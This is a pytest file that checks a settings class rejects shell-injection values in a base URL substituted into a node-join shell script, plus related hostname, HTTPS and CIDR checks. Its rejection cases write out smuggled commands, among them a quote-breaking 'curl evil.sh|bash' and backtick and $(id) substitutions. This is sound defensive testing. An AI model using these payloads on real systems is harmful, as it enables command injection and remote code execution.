"""对外地址配置的形态与协议闸门(Settings 层):public_base_url 逐字替换进 node-join.sh。"""

import base64

import pytest
from pydantic import ValidationError

from app.core.config import Settings

_KEY = base64.urlsafe_b64encode(b"k" * 32).decode()


def _settings(**overrides) -> Settings:
    return Settings(
        **{  # type: ignore[arg-type]
            "_env_file": None,
            "environment": "test",
            "config_encryption_key": _KEY,
            **overrides,
        }
    )


def _prod_kwargs() -> dict:
    """能过 prod 校验的最小配置。"""
    return {
        "_env_file": None,
        "environment": "prod",
        "jwt_secret": "9f4a1c7e2b8d0f63a5e9c417b3d68f02a1c4e7958b0d326f7a9c1e4b58d2f603",
        "sms_provider": "aliyun",
        "k8s_backend": "real",
        "payment_mock": False,
        "database_url": "postgresql+asyncpg://svc:pw@pg.internal:5432/superdl?sslmode=require",
        "cors_origins": ["https://console.superdl.cn"],
        "admin_host": "admin.superdl.cn",
        "admin_edge_token": "edge-token-for-tests",
        "jupyter_domain_suffix": "app.superdl.cn",
        "service_domain_suffix": "svc.superdl.cn",
        "public_base_url": "https://api.superdl.cn",
        "metrics_token": "mtoken",
        "config_encryption_key": _KEY,
    }


class TestPublicBaseUrlShape:
    """形态闸门与环境无关。"""

    @pytest.mark.parametrize(
        "bad",
        [
            # 闭合双引号后追加命令
            'https://api.superdl.cn";curl evil.sh|bash;#',
            "https://api.superdl.cn`id`",  # 反引号命令替换
            "https://api.superdl.cn$(id)",  # $() 命令替换
            "https://api.superdl.cn\nAPI_BASE=http://evil",  # 换行后另起赋值行
            "https://api.superdl.cn\\",  # 反斜杠续行,吃掉下一行
            "https://api superdl.cn",  # 空白拆词
            "ftp://api.superdl.cn",  # 非 http(s) 协议
            "api.superdl.cn",  # 缺协议头
            "https://api.superdl.cn/x;y",  # 路径里的分号
        ],
    )
    def test_rejects_injectable_values(self, bad: str):
        """含 shell 元字符的 public_base_url 拒收。"""
        with pytest.raises(ValidationError, match="public_base_url"):
            _settings(public_base_url=bad)

    @pytest.mark.parametrize(
        "good",
        [
            "https://api.superdl.cn",
            "https://api.superdl.example.com",
            "http://localhost:8000",  # dev 形态:协议闸门只在 prod 生效
            "https://api.superdl.cn:8443/base-path",
        ],
    )
    def test_accepts_normal_values(self, good: str):
        assert _settings(public_base_url=good).public_base_url == good

    @pytest.mark.parametrize(
        "name", ["jupyter_domain_suffix", "service_domain_suffix", "admin_host"]
    )
    def test_bare_hostname_settings_reject_metacharacters(self, name: str):
        """域名三项同口径拒元字符。"""
        with pytest.raises(ValidationError, match=name):
            _settings(**{name: 'evil.cn";id;#'})


class TestPublicBaseUrlScheme:
    def test_prod_rejects_plain_http(self):
        """prod 明文 http 拒收。"""
        kwargs = {**_prod_kwargs(), "public_base_url": "http://api.superdl.cn"}
        with pytest.raises(ValidationError, match="public_base_url"):
            Settings(**kwargs)


class TestTenantPodCidr:
    def test_rejects_non_cidr(self):
        """非法 Pod 网段在 Settings 层拒收。"""
        with pytest.raises(ValidationError, match="tenant_pod_cidr"):
            _settings(tenant_pod_cidr="10.42.0.0/33")
